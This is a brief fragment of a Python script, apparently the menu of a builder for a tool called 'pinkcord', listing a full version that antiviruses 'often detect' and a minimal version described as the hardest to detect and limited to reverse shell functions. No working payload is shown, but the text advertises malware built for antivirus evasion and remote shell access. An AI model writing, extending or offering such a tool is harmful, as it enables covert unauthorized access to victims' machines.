...
RED_COLOR = "\033[31m"
versions = ["pinkcord.py", "pinkcord_minimal.py"]
versions_descriptions = ["it has all the features but antiviruses often detect it", "the minimal version, the hardest to detect, has only reverse shell functions"]
